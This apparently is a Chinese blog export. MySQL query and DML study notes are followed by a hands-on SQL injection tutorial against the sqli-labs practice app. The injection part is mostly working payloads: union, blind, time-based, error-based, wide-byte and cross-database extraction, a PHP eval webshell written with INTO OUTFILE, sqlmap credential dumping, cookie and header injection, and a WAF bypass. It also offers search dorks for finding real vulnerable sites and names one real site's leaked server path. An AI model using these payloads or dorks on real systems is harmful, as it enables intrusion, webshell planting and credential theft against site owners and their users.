d;案例2:查询员工号&#x3D;102的部门名mysql&gt; select ( -&gt; select department_name -&gt; from departments d -&gt; inner join employees e -&gt; on d.department_id &#x3D; e.department_id -&gt; where e.employee_id &#x3D; 102) 部门名;+--------+| 部门名 |+--------+| Exe |+--------+ 三、from后面1234567891011121314将子查询结果充当一张表，要求必须起别名案例:查询每个部门的平均工资的工资等级①先查询部门的平均工资select avg(salary) ag,department_id -&gt; from employees -&gt; group by department_id②将查询工资等级并将平均工资表连接，进行工资等级判断mysql&gt; select ag_dep.*,g.grade_level -&gt; from ( -&gt; select avg(salary) ag,department_id -&gt; from employees -&gt; group by department_id) ag_dep #子查询必须加别名不然找不到 -&gt; inner join job_grades g -&gt; on ag_dep.ag between lowest_sal and highest_sal; 四、exists(相关子查询)123456789101112131415161718192021#exists(是否存在)语法: exists(完整的查询)结果: 1或者是0 #1也就相当于布尔类型的True，0代表Falseexists相当于布尔类型，只判断True和False因为子查询中有数值所以返回1mysql&gt; select exists(select employee_id from employees) result;+--------+| result |+--------+| 1 |+--------+在子查询中筛选了salary中等于3w的数值，但是salary中并没有3w所以返回0mysql&gt; select exists(select employee_id from employees where salary&#x3D;30000) result;+--------+| result |+--------+| 0 |+--------+ 1234567891011121314151617181920212223242526272829303132333435363738但凡能用exists的都可以用in来代替案例一:查询有员工名的部门名#existsmysql&gt; select department_name -&gt; from departments d -&gt; where exists(select * from employees e -&gt; where d.department_id &#x3D; e.department_id);+-----------------+| department_name |+-----------------+| Adm || Mar || Pur || Hum || Shi || IT || Pub || Sal || Exe || Fin || Acc |+-----------------+ #inmysql&gt; select department_name from departments d -&gt; where department_id in (select department_id from employees);案例2:查询没有女朋友的男神信息#inmysql&gt; select bo.* -&gt; from boys bo -&gt; where bo.id not in (select boyfriend_id -&gt; from beauty);#existsmysql&gt; select bo.* -&gt; from boys bo -&gt; where not exists (select * from beauty -&gt; where bo.id&#x3D;beauty.boyfriend_id); 12345678910子查询案例:查询各部门中工资比本部门平均工资高的员工的员工号，姓名和工资mysql&gt; select employee_id,last_name,salary,e.department_id -&gt; from employees e -&gt; inner join ( -&gt; select avg(salary) ag,department_id -&gt; from employees -&gt; group by department_id) ag_dep -&gt; on e.department_id &#x3D; ag_dep.department_id -&gt; where salary&gt;ag_dep.ag; 分页查询(重点)1234567891011121314151617应用场景:当要查询的条目太多，一页显示不全1、limit用来获取一张表中某部分数据2、limit只有在MySQL中存在不通用，是MySQL数据库管理系统的特色语法: select 查询列表 #7 from 表 #执行循序 1 【join type join 表2 #2 【on 连接条件】 #3 【where 筛选条件】 #4 【group by 分组字段】 #5 【having 分组后筛选】 #6 【order by 排序的字段】 #8 limit 【offset】,size; #9 offset可以省略，省略之后默认起始值是0 offset表示要显示条目的起始索引(起始索引从0开始，) 如果起始下标没有指定，默认从0开始，0标识表中第一条记录 size表示要显示的条目个数 123456789101112131415特点: ①limit语句放在查询语句的最后， ②公式 要显示的页数 page，每页的条目数是size通用的分页sql【只适合MySQL数据库管理系统】 select 查询列表 from 表 limit (page-1)*size,size;规律： size &#x3D; 10 page size 1 0 2 10 3 20 12345678910111213案例1:查询前五条员工信息mysql&gt; select * from employees limit 0,5;或mysql&gt; select * from employees limit 5;案例2:查询第11条到第25条mysql&gt; select * from employees limit 11,15;案例3:有奖金的员工信息，并且工资较高的前10名显示出来mysql&gt; select * from employees -&gt; where commission_pct is not null -&gt; order by salary desc -&gt; limit 10; 联合查询1234567891011121314151617union 联合 合并; 将多条查询语句的结果合并成一个结果&lt;&gt; 也就是相当于联合查询中包含多条查询语句，每个查询语句都是有一个小结果，用union一联合就会将多个结果合并成一个结果语法:查询语句1union查询语句2union...应用场景:要查询的结果来自于多个表，且多个表没有直接的连接关系，但查询的信息一致时注意事项: ★ 1、要求多条查询语句的查询列数是一致的 2、要求多条查询语句的查询的每一列的类型和顺序最好是一致的 3、使用union关键字默认去重，如果使用union all 可以包含重复项 12345678910引入案例:查询部门编号&gt;90或者邮箱中包含a的员工信息之前实现语法:mysql&gt; select * from employees where email like &#39;%a%&#39; or department_id&gt;90;union实现语法:# 将邮箱中包含a的员工信息查找出来，这是第一个结果mysql&gt; select * from employees where email like &#39;%a%&#39;# 使用union联合查询，将两条结果合并成一个结果 -&gt; union# 将部门编号&gt;90的信息查找出来，这是第二个结果， -&gt; select * from employees where department_id&gt;90; DML语言123456DML语言可以以称作:数据操作语言涉及到：数据的 插入:insert数据的 修改:update数据的 删除:delete 插入语句123insert语法中要包含 表名、字段名、值语法：insert into 表名(字段名,......) values(值1,....); 12345678910111213141516171819202122232425262728293031323334353637383940414243方式一:经典的插入注意:1、插入的值得类型要与列的类型一致或兼容mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id) -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2);+----+------------+------+---------------------+-------------+-------+-------+| 12 | 赵敏 | 女 | 1992-02-03 00:00:00 | 18209179577 | NULL | 1 || 13 | 唐艺昕 | 女 | 1990-04-23 00:00:00 | 1898888888 | NULL | 2 |+----+------------+------+---------------------+-------------+-------+-------+2、不可以为null的列必须插入值，可以为null的列，如何插入值 方式一:mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id)#可以为null的列不想写入值可以直接写null -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2); 方式二:#将 为null的列和值不写，其中可以为null的字段不写入值得时候，运行时显示他的默认值mysql&gt; insert into beauty(id,name,sex,borndate,phone,boyfriend_id) -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,2); 3、列的顺序可以调换，但需要一一对应mysql&gt; insert into beauty(name,sex,id,phone) -&gt; values(&#39;蒋欣&#39;,&#39;女&#39;,16,&#39;110&#39;);+----+------------+------+---------------------+-------------+-------+-------+| 16 | 蒋欣 | 女 | 1987-01-01 00:00:00 | 110 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+-------+4，列数和值的个数必须一致# boyfrined_id可以为空，但是values里面的值并没有写入null那这样就会报错mysql&gt; insert into beauty(name,sex,id,phone,boyfrined_id) -&gt; values(&#39;关晓彤&#39;,&#39;女&#39;,17,&#39;110&#39;);# 报错内容是:列与值不匹配ERROR 1136 (21S01): Column count doesn&#39;t match value count at row 15，可以省略列名，默认所有列，而且列的顺序和表中的列顺序一致mysql&gt; insert into beauty -&gt; values(14,&#39;张飞&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,null);+----+------------+------+---------------------+-------------+-------+-------+| 14 | 张飞 | 男 | NULL | 11111 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+-------+ 123456789101112方式二:语法:insert into 表名set 列名&#x3D;值,列名&#x3D;值....案例1:mysql&gt; insert into beauty -&gt; set id&#x3D;15,name&#x3D;&#39;刘涛&#39;,phone&#x3D;&#39;999&#39;;+----+------------+------+---------------------+-------------+-------+---+| 15 | 刘涛 | 女 | 1987-01-01 00:00:00 | 999 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+---+ 12345678910111213141516171819两种方式比较方式一支持插入多行,方式二不支持mysql&gt; insert into beauty -&gt; values(17,&#39;张飞1&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2) -&gt; ,(18,&#39;张飞2&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2) -&gt; ,(19,&#39;张飞3&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2);+----+------------+------+---------------------+-------------+-------+---+| 17 | 张飞1 | 男 | NULL | 11111 | NULL | 2 || 18 | 张飞2 | 男 | NULL | 11111 | NULL | 2 || 19 | 张飞3 | 男 | NULL | 11111 | NULL | 2 | +----+------------+------+---------------------+-------------+-------+---+方式一支持子查询，方式二不支持# 子查询在这里可以充当插入，也可以将select后的值改成变量，来写成完整的子查询mysql&gt; insert into beauty(id,name,phone) -&gt; select 20,&#39;宋茜&#39;,&#39;115112313&#39;; # 例如: select id,boyname,&#39;115112313&#39;;+----+------------+------+---------------------+-------------+-------+-------+| 20 | 宋茜 | 女 | 1987-01-01 00:00:00 | 115112313 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+-------+ 二、修改语句1234567891011121314151617181、修改单表的记录★语法:update 表名set 列&#x3D;新值,列&#x3D;新值,...where 筛选条件;2、修改多表的记录【补充】sql92语法:update 表1 别名,表2 别名set 列&#x3D;值...where 连接条件 and 筛选条件;sql99语法update 表1 别名inner|left|right join 表2 别名on 连接条件set 列&#x3D;值...where 筛选条件 1234567891011121314151617181920212223242526271、修改单表的记录案例1: 修改beauty表中姓张的电话为13899888899mysql&gt; update beauty set phone &#x3D; &#39;13899888899&#39; where name like &#39;张%&#39;;案例2: 修改boys表中的id号为2的名称为张飞，魅力值为10mysql&gt; update boys set boyname&#x3D;&#39;张飞&#39;,usercp&#x3D;10 where id &#x3D; 2;+----+---------+--------+| id | boyName | userCP |+----+---------+--------+| 1 | 张无忌 | 100 || 2 | 张飞 | 10 || 3 | 黄晓明 | 50 || 4 | 段誉 | 300 |+----+---------+--------+2、修改多表记录【补充】案例1:修改张无忌的女朋友的手机号为114mysql&gt; update boys bo -&gt; inner join beauty b on bo.id &#x3D; b.boyfriend_id -&gt; set b.phone &#x3D; &#39;114&#39; -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;;案例2:修改没有男朋友的女神的男朋友编号都为2号mysql&gt; update boys bo -&gt; right join beauty b on bo.id&#x3D;b.boyfriend_id -&gt; set b.boyfriend_id&#x3D;2 -&gt; where bo.id is null; 三、删除语句12345678910111213141516171819202122删除语句删除的时候是直接删除一行而不是单个值方式一:delete语法:1、单表的删除【★】delete from 表名 where 筛选条件2、多表的删除【补充】sql92语法：delete 表1 别名,表2 别名from 表1 别名,表2 别名where 连接条件and 筛选条件sql99语法:delete 表1 别名,表2 别名from 表1 别名inner|left|right join 表2 别名 on 连接条件where 筛选条件方式二，truncate语法: truncate table 表名; 1234方式一：delete1、单表的删除案例1：删除手机号结尾为9的女神信息mysql&gt; delete from beauty where phone like &#39;%9&#39;; 1234567891011122、多表的删除【了解】案例:删除张无忌的女朋友的信息mysql&gt; delete b from beauty b -&gt; inner join boys bo on b.boyfriend_id &#x3D; bo.id -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;; 案例:删除黄晓明得信息以及他女朋友的信息mysql&gt; delete b,bo -&gt; from beauty b -&gt; inner join boys bo -&gt; on b.boyfriend_id&#x3D;bo.id -&gt; where bo.boyName&#x3D;&#39;黄晓明&#39;; 方式二:truncate语句123案例:将魅力值&gt;100的男神信息删除# truncate的意思是全部清空，后面不能加where筛选，所以不能将&gt;100的信息删除truncate table boys; 12345delete和truncate的区别1、delete可以加where条件，truncate不能加2、truncate删除效率高一点3、假如要删除的表中有自增长列,如果用delete删除后，在插入数据，自增长列的值从断点开始，而truncate删除后，在插入数据，自增长列的值从1开始4、truncate删除后没有返回值，delete删除后有返回值 例题: 创建表 插入内容12345678向my_employees表插入内容方式一:mysql&gt; insert into my_employees -&gt; values(1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39;), -&gt; (2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860), -&gt; (3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100), -&gt; (4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750), -&gt; (5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550); 12345678方式二:mysql&gt; insert into my_employees -&gt; select 1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39; union -&gt; select 2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860 union -&gt; select 3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100 union -&gt; select 4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750 union -&gt; select 5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550;Query OK, 5 rows affected (0.00 sec) 12345678向users表插入内容mysql&gt; insert into users -&gt; values(1,&#39;Rpatel&#39;,10), -&gt; (2,&#39;Bdancs&#39;,10), -&gt; (3,&#39;Bbiri&#39;,20), -&gt; (4,&#39;Cnewman&#39;,30), -&gt; (5,&#39;Aropebur&#39;,40);Query OK, 5 rows affected (0.00 sec)","categories":[],"tags":[]},{"title":"sql注入","slug":"sql注入","date":"2020-04-03T06:09:55.917Z","updated":"2020-04-03T06:21:11.370Z","comments":true,"path":"2020/04/03/sql注入/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"sql注入sql注入SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作 SQL注入原理SQL注入的而产生的需要满足两个条件： 参数用户可控：前端传给后端的参数内容是用户可以控制的 参数代入数据库查询：传入的参数拼接到SQL语句查询，且带入数据库查询 当传入的参数为1’时,数据库执行代码如下1select * from users where id&#x3D;1&#39; 这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下1select * from users where id&#x3D;1 and 1&#x3D;1 因为1=1为真，where语句中id=1也为真，页面返回与id=1相同的结果。当传入参数and 1=2 时，1=2不成立，返回与id=1不同的结果。由此可以判断ID参数存在sql注入。 SQL注入相关知识在mysql5.0版本后，默认在数据库有一个information_schema的库，要记住其中三个表名， 分别是SCHEMATA(schemata)、TABLES(tables)、COLUMNS(columns)。 SCHEMATA表存储该用户创建的所有数据库的库名，该表中记录数据库字段的名为SCHEMA_NAME(schema_name) TABLES表存储该用户创建的所有数据库的库名和表名，该表中记录数据库库名和表名的字段，分别为TABLE_SHCEMA(table_schema)和TABLE_NAME(table_name) COLUMNS表存储该用户创建的所有数据库的库名、表名和字段名，该表中记录数据库库名、表名和字段名的字段为，TABLE_SCHEMA(table_schema)、TABLE_NAME(table_name)、COLUMN_NAME(column_name) 需要记住的几个函数 database()查看当前数据库 version()查看当前版本 user()查看当前用户 注释符MySQL中常见注释符的表达方式：#–空格或/* */ Union注入Union注入也叫联合注入http://127.0.0.1/Less-1/?id=1测试地址 测试当前页面出错信息123456789当1&#x3D;1的时候为真返回正确页面http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1但1&#x3D;2时返回还是正确页面，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2&#39;所以可以尝试在id&#x3D;1后面加上单引号&#39; ，id&#x3D;1&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;这里报错了，说明存在注入点 123456使用order by 查询字段数，因为使用单引号了&#39; 所以要用注释符注释一下，我们这里可以用# 也可以用--+其中%23代表#井号http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4%23我们发现出错了，说没有4这个列 12345这里我们尝试一下3看看有没有这个列http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3%23页面返回正常，说明字段数是3 12345我们这里使用联合查询，查看一下当前版本和库名http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3%23这里返回了2和3 12345我们可以在2和3的字段上查询一下库名和版本号http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,version(),database()%23版本号是5.5.53，当前库名是security 12345我们知道了版本号和当前库名之后就要进行查询当前库中的表，因为当前版本是5.0以上所以数据库中有information_schema这个库，我们来查询一下http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23这里我们查看了当前security下的表 12345在大部分情况下用户的用用户名和密码都在users表中，我们来查看一下users表http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+发现有id，username，password，这些正是我们想要的 12345查看id，username，password字段的数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(id,username,password) from users--+这样我们想要的数据就查询出来了 Boolean注入布尔注入，也叫盲注，这是我们的初始页面 123先测试页面报错信息http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;这里使用单引号出错了，加上注释符返回成功页面如下。 123456因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入首先要查询当前数据库的长度，在布尔注入中要用and来连接http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8 知道数据库的长度了我们就要注入出数据库的名称，因为盲注不适用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。 12345判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+我们这两将GET请求发送到 intruder模块下 1现将1的位置clear$掉，然后选中101进行Add$ 12现在intruder下的payloads在payload type选择Numbers起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照 1我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行 123这里我们已经知道他的库名是security，我们要查询表名http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+然后继续抓包进行自动扫描 12这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始 1查询出了表我们查询字段，查看users的字段 123456789我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出id，username，password字段查询字段数据和union一样将from后的删掉加上该加的然后查询表数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+还有个时间注入效率非常慢，能不用时间注入就不用,这里演示的是查询他的库名，表名和字段名跟union一样http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+ 报错注入什么时候需要报错注入 在实际场景中，如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1 正常进行绕过，但是在Less-5没有数据回显，断定为报错注入 123456789101112131415161718191、updatexml0x7e编码是~的解码形式，可以理解为，让后台xml故意报错concat就是排序这是查看当前数据库http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+进一步获取表名，列名，数据。。。在报错注入的情况下不能使用union select，只能使用select来查询语句 之前用union获取表名union select 1,group_concat(table_name),3 from information_schema.tables where table_schem&#x3D;&#39;security&#39;报错注入and undatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;seurity&#39; limit 0,1),0x7e),1)因为使用了limit如果数据库内容少的话可以手动一个一个加，但是如果数据库有几百条的话，就不能手动加了，效率太慢，可以使用burp，抓包发送的intruder模块然后$clear清除，将limit第一个值$add一下，选择Payload模块里面的Number设置值，进行攻击2、extractvalue对数据库让他进行一个xml文档的故意报错利用这种方式面对后台进行一个排序，指定第一个参数为null，让他故意报错，将第二个参数的语句带入数据库执行and extractvalue(null,concat(0x7e,(select database()),0x7e)) 加解密注入很多情况下，网站管理员会对传进的参数进行一个加密的操作，加密很可能自己写，也有可能base64，md5等， 1234在百度搜索以下代码之后会出现一些网址，随便进一个就行inurl:Mw&#x3D;&#x3D;划横线的地方就是典型的base64编码，我们将这一小段代码复制，然后用转换公爵转换一下 发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果 这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存 打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码 这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出 宽字节注入在很多情况下，’为了安全经常会替换成/‘符号进入后台 当输入id=1’加上单引号的时候会爆出一个反斜杠的错误，这样，我们传入的单引号被转义了，无法逃逸单引号的包围，一般情况下是不存在SQL注入漏洞的，不过有一个特例就是当数据库的编码为GBK编码时，可以使用宽字节注入。 %df是β的URL编码 宽字节的格式是在地址后面加一个%df再加单引号，因为反斜杠的编码是%5c而在GBK中%df%5c是繁体字連，所以这个时候单引号成功逃逸，报出mysql 的错误 之后的查询跟union一样 12这里查看的是表名，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+ 跨库注入如果要应用跨库注入，有一个条件，那就是当前数据库用户为root用户，才可以对整个数据库进行操作 确定用户：user() 确定用户 如果回显root@localhost或者root@127.0.0.1只要@前面是root那就是root用户123跟union查询一样，先获取字段，然后再返回数字位置查看当前用户http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,user()--+ 因为@前是root，所以我们可以进行一个跨库注入 获取数据库过程：第一步：获取当前所有数据库存有所有数据库的表名为： information_schema.schemata 存储所有数据库schema_name 获取数据库名1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 这里我们获取myemployees库里的表1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;myemployees&#39;--+ 获取当前字段1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;employees&#39; and table_schema&#x3D;&#39;myemployees&#39;--+ 获取department表的数据1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(location_id) from myemployees.departments--+ 跨库注入和普通注入的区别 跨库注入首先要获取所有数据库名称 在查询表名，字段名，必须限定你的要注入的数据库名称 mysql高权限用户注入getshell mysql注入高权限文件操作目的：发现了注入点，还想进一步渗透，写入文件来getshell写入PHP EVAL 一句话木马 写入php一句木马有一个前提：我们的木马必须被mysql允许上传，设置secure_file_priv=为空 secure_file_priv 是可以绕过的(通过mysql的日态文件来进行绕过，有一个前提，网站必须开启这个日态功能，如果没有开启，就不许有一个执行sql语句的地方) 写入文件sql labs第七关 文件写入sql语句绕过分析12345将引号里的id删除SELECT * FROM users WHERE id&#x3D;( (&#39; $id &#39; ) )加上 &#39;))--+SELECT * FROM users WHERE id&#x3D;( (&#39; &#39;))--+ &#39; ) ) 在sqli labs里面尝试写入1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;&#39;))union 1,2,3--+ 这里并没有响应，文件写入注入点，一定没有反应 文件写入语句: 1union select 1,2,3 在这个2中使用单引号写入你想写入的东西 12这里我们直接使用一句话木马进行上传,这里最后是路径，路径必须存才否则报错，这里必须用双斜杠，因为单斜杠会被转义union select 1,&#39;&lt;?php eval($_POST[&quot;pass&quot;])?&gt;&#39;,3 into outfile &#39;D:\\\\1\\\\1.php&#39; 在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。1、通过错误爆出路径123这两个命令可以再百度查看一些错误网页信息inurl:php warninginurl:edu.cn warning 网站 错误信息 www.doushanedu.cn/ /www/wwwroot/zhanqun/data/function.php 2、通过对方网站遗留文件爆出路径常见的遗留的phpinfor.php文件 3、通过漏洞爆出路径discuz爆出路径 4、根据对方web服务器类型猜解路径IIS:\\inetpub\\wwwroot\\ PHPSTUDY2020:\\phpstudy pro\\www PHPSTUDY2018:\\phpStudy\\PHPTutorial\\WWW 只要爆出来路径，并且secure_file_priv为空，即可写入文件getshell sqlmap爆出库名1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs 爆出想要查询数据库的表名，这里查询security1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables 爆出字段，这里查询users表1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns 爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C password,username --dump 还可以使用sqlmap查看当前用户1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --users 如果用户为root用户可以查询数据库密码1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --password 爆出以上加密密码，使用md5在线解密，查看密码12*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B查看这个解密之后的值，可以看到，当前数据库密码为root 查看当前数据库1sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db 注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”之前都是以GET请求注入，我们现在要以多种请求注入请求方式GET 最常见的请求方式POST 一般用于登录框COOKIE 想用哪里用哪里POST请求注入确定字段数 只需要在登录框提交sql注入语句123这里测试了，他的字段数是2例如：-1&#39; order by 2 1234查看当前数据库-1&#39; union select 1,database() #后面查询跟Union相同 COOKIE请求注入如果获取到cookie呢？可以使用burp抓包，然后在cookie后写入sql注入语句 1这里用-1&#39; order by 3 # 查看字段是是否是3，发现页面返回正常 1查看-1&#39; order by 4 # 字段4是否是正常，页面返回错误，我们可以确定字段是3 查看当前库名1-1&#39; union select 1,2,database()# 查看当前库名，如果要查询表名和字段名数据，和union注入相同 HTTP头部注入如果user-Agent这里，如果添加一个sql查询，就可以通过user-Agent进行sql注入 参数类型注入(三种)1、数字型1234语句：select * from mars where id&#x3D;1连接后就构造成了sql语句的查询连接：select * from mars where id&#x3D;-1 union select 1,database(),user() 1ID：-1 union select 1,database(),user() 2、字符型123语句：select * from mars where id&#x3D;&#39;mars&#39;连接：select * from mars where id&#x3D;&#39;-1’ union select 1,database(),user()--+&#39; 1ID：-1’ union select 1,database(),user()--+ 3、搜索型1234语句：select * from mars where mars like id&#x3D;&#39;%a%&#39;%&#39;闭合前面，后面虽然也可以用注释符注释掉但不推荐 还是用&#39;%来将其闭合，中间剩下的就是sql注入语句连接：select * from mars where mars like id&#x3D;&#39;%%&#39; union select 1,database(),user()&#39;%%&#39; 1ID：%&#39; union select 1,database(),user()&#39;% 绕过过滤注释符号的注入如果过滤注释符号 使用preg_replace函数 注释注入在这里就不工作了，怎么办呢？ 注入，不一定使用注释，也可以使用闭合 闭合不好之处就是，执行点少 1这里使用--+还是返回正确页面，因为网页将注释符给过滤掉了 12345678使用union select强制闭合$sql &#x3D; select * from users where id&#x3D;&#39;$id&#39;payload:-1&#39; union select 1,2,&#39;3我们来进行一个带入可以看到，带入之后-1被闭合了，3被闭合了，所以我们只有在2的位置进行一个sql语句执行点只有2，因为1被省略了网站不显示，3被闭合了不能使用$sql &#x3D; select * from users where id&#x3D;&#39;-1&#39; union select 1,2,&#39;3&#39; 123456还有一种就是 or 闭合select * from users where id&#x3D;&#39;$id&#39;plyload:-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1这里还是 -1闭合了，or后面的全部闭合了，执行中间的一部分，带入：select * from users where id&#x3D;&#39;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1&#39; 1虽然执行中间一部分就是union select 1,2,3，但是可控点还是只有2，只能在2的位置进行查询 扩展思考搜索性注入 select * from users where username like ‘%mysql%’ 两种方法 第一种：注释 %’ union select 1,2,3 –+ 第二种：闭合 %’ union select 1,2,3 ‘% 过安全狗安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果安装http://free.safedog.cn/website_safedog.html 注意：一定要改成系统服务 1我们可以看到正常输入网址已经被拦截了，我们可以输出union select 发现页面还是显示防火墙，然后将a加入到union和select发现出错了，表示防火墙拦截的不是union也不是select而是拦截的 union select他们的一个整体 